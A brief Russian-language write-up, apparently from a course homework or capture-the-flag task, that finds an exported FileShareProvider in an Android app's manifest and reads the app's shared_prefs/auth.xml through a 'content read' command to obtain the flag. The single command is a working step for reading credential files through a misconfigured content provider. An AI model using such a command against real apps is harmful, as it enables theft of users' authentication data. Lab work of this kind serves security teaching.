Смотрим на манифест, видим FileShareProvider.

![image](/resourses/mobile4.png)

Через него нам необходимо прочитать чувствительную информацию. Повторим команду с семинара:

`content read --uri content://com.yandex.shad.homework.file_share/data/data/com.yandex.shad.homework/shared_prefs/auth.xml`

Получим флаг.